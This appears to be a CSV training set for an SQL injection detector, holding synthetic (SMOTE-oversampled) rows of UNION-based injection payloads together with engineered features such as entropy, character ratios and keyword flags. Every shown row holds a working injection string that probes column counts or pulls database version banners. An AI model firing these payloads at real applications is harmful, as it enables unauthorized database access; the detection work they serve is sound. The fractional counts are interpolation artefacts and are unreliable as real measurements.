id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000128,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.016749123093563682,111.89288260171091,27.982147100285154,3.974364596012563,65.92858840114062,4.0,31.98214710028515,9.982147100285152,0.5892075176225428,0.03575037648190332,0.28583458827301106,0.08920751762254278,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.0,5.982147100285152,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000129,attack,union,"-3359 union all select 4675,4675,4675--",nearest_attack_euclidean,R000294,1.1144162391150865,37.372973355483886,19.0,3.9973434778029575,14.0,13.396757368774203,5.301621315612897,4.674594671096775,0.3761526191728701,0.35332274788420204,0.1457551567775019,0.12476947616542598,0.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,0.3254053289032246,0.0,0.0,1.3491893421935512,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.3254053289032245,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000200,0.4353072035356509,70.3766568921662,25.07533137843324,4.149529298180268,27.0,24.30132551373296,11.0,8.075331378433239,0.38560620798184875,0.3429852349844756,0.15709882547408655,0.11430973155958916,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,4.07533137843324,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000146,0.4647699044772775,107.08905293972357,33.47124235177886,4.423208465592764,37.0,38.47124235177886,17.0,14.617810587944716,0.3456867538135346,0.3590158167567884,0.15882904904946182,0.13646838038021528,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.6178105879447156,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000132,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000072,0.7071564036076726,71.18987156750939,28.40144691892723,4.061695093408405,25.0,20.0,19.59131848643662,6.598553081072771,0.352007505206185,0.28160600416494797,0.2738161342297506,0.09257035639911643,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.5985530810727702,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000198,0.18358597064187304,108.21369130084733,26.213691300847337,3.924767873602916,25.0,51.572617398305326,16.641073902542015,15.0,0.23103179440057378,0.47666083597415093,0.15368829298493097,0.13861907664034429,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.1068456504236688,0.0,0.0,8.893154349576331,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000094,0.06702513623475724,106.62262161607921,27.0,4.0755973018178455,29.0,47.69809729286338,15.0,14.924524323215845,0.2725791293009193,0.446587059940877,0.14098920481082033,0.13984460594738332,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.924524323215845,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000065,0.12453006855681577,88.7525947460958,26.08362163845509,3.7941047504399106,46.25086491536527,3.0,29.334486553820355,10.167243276910177,0.5212578203176823,0.033826407657182866,0.33043692234060607,0.11447884968452877,0.0,1.0,2.0,0.0,1.0,1.0,0.0,3.0836216384550887,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000136,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000191,0.17869608900655123,101.25880807387354,29.748238385225292,4.151689673862789,62.00704645909883,9.0,17.0,13.251761614774708,0.6121743048548725,0.08897006612137617,0.16805456934037727,0.13080105968337408,3.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.251761614774707,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000137,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000081,0.6427184090824255,82.57544757300867,24.969820970796533,4.035166856441307,27.0,34.06035805840693,11.0,10.515089514601733,0.327273958165995,0.4121197532847467,0.13333383480836836,0.12727245374089,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,6.515089514601733,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.43482652709773173,69.36167358595924,20.0,3.534221803495095,14.0,39.36167358595923,4.0,12.0,0.2019343224667902,0.5672835947140209,0.05769552070479719,0.1730865621143916,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.15958160351019154,0.0,7.840418396489809,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-4406%' union all select 9599,9599,9599,9599#",nearest_attack_euclidean,R000220,0.2247878688609711,45.287510384467296,21.115004153786916,3.846245883033846,14.0,20.230008307573833,4.0,7.057502076893459,0.30932215760775905,0.44648896273398964,0.0883777593165026,0.1558111203417487,0.9424979231065416,0.057502076893458265,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.057502076893458,1.0,0.9424979231065416,0.057502076893458265,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.06943758748068486,39.71602817931547,19.056794364136906,3.949421443021576,14.0,15.772822543452373,4.0,5.943205635863094,0.3528397182068453,0.3967546077636054,0.10081134805909867,0.14959432597045066,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,1.9432056358630936,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000230,0.4550599348801266,104.7449814683237,27.7516728438921,4.035541209664224,29.0,44.993308624431606,15.0,15.751672843892099,0.2769047032187826,0.4294145320214453,0.14322657063040478,0.15045419412936728,2.5033456877841997,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.2483271561079015,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000146,0.5692504364064843,104.79229039639165,34.158458079278326,4.46077705403607,37.0,36.63383231711332,17.0,14.15845807927833,0.35464427633549767,0.347588923161203,0.16294466750549894,0.13482213299780044,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.158458079278328,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000143,attack,union,"-8477' union all select 2517,2517,2517--",nearest_attack_euclidean,R000309,0.5776153828841405,39.17068848697546,20.0,4.09140875551003,14.0,15.17068848697546,4.0,6.0,0.3580627508210719,0.386178141449591,0.10230364309173484,0.15345546463760223,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.20732787825613463,0.0,1.7926721217438653,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,0.00017091115602429704,88.00097683330935,27.00008140277578,3.943940930419674,25.0,36.000325611103115,16.000488416654676,11.000162805551557,0.2840881339962803,0.40909016906567475,0.1818212899241661,0.1250004070138789,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.000081402775779,0.0,0.0,5.000081402775779,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000237,0.06886331035619199,84.61069000121427,26.155723999514294,4.031850809023837,25.0,27.688552000971413,22.0,9.922138000242853,0.2955489338190652,0.3271217058894957,0.2600830617607774,0.11724629853066174,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,2.922138000242853,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000295,0.10013800902149277,79.5780853225014,27.939726474643056,4.101373278951386,25.0,24.0,21.638358847858342,8.939726474643056,0.314306141598881,0.3017338959349257,0.2716354162215131,0.11232454624468013,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.939726474643057,0.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,0.24012787849168943,73.0,32.0,4.397938940737863,44.0,2.0,16.255674458126972,10.744325541873028,0.6027397260273972,0.0273972602739726,0.22268047202913657,0.14718254166949354,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.744325541873029,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,0.15595268920791747,100.24716345729958,26.0,4.0386930118702775,63.66288460973277,4.584278847566807,24.0,8.0,0.6349080453566024,0.04581182299689207,0.2394600987348792,0.07982003291162641,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000149,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,1.2929652439942763,56.21680498893894,20.87413555063953,3.8504597909390172,31.251728898720945,8.028008314898234,11.0,5.937067775319764,0.5651014275285707,0.13311463662855266,0.1969152412111197,0.10486869463175695,1.0,0.0,2.468533887659882,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.468533887659882,2.468533887659882,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000162,0.07430193320132192,40.0,20.0,4.121983558146458,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.06137538347974499,61.475938752714406,20.03172925018096,3.642921563812596,14.0,32.38075100217152,4.0,11.095187750542882,0.2280709356044,0.52631487727472,0.0651631244584,0.18045106266248,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,6.095187750542881,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000153,attack,union,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",nearest_attack_euclidean,R000210,0.5926606645391211,107.21759423402091,25.65278270206269,3.752595803645092,25.0,52.0,16.0,14.217594234020897,0.2331741211621216,0.48500217201721296,0.14923143754375784,0.13259226927690754,0.2175942340208974,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,9.0,4.0,0.2175942340208975,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000135,0.9784515552391037,101.8964543266292,29.62070913467416,4.247867859968045,37.0,33.51716346130335,17.0,14.379290865325839,0.36505561625978183,0.3264143356629857,0.1677282561193592,0.1408017919578732,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.379290865325837,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000155,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000257,0.585732223294209,120.46670144681323,29.39556019290843,4.207964105004627,37.0,48.37336115745058,17.0,18.093340289362644,0.3081986942885753,0.40017466686887526,0.14160480548394,0.1500218333586094,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.093340289362645,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000156,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000212,0.28557834450068664,113.79600566210861,27.240798867578278,3.767586565577885,25.0,51.03680452968689,22.0,15.759201132421722,0.2197707397982043,0.44836681632287306,0.1933982510224198,0.1384641928565028,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,8.759201132421722,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000157,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000107,0.2916311572143177,89.96742566020555,26.590227698061664,4.0072890900395866,29.0,33.57394052816444,15.0,12.39348513204111,0.3229295751222216,0.3723967005278169,0.1670325388563215,0.13764118549363996,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.39348513204111,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000136,0.36641315283945725,110.00997406334596,29.0,4.054614319447494,29.0,49.60797925067676,15.0,16.40199481266919,0.2644672884380501,0.44980883186134046,0.13679342505416386,0.1489304546464455,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.40199481266919,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.28325647903638007,92.03626037123158,30.407252074246315,4.325951275707952,37.0,25.62900829698526,17.0,12.407252074246314,0.40305366764884604,0.2771195662933889,0.18518682027109143,0.13463994578667363,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.4072520742463146,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
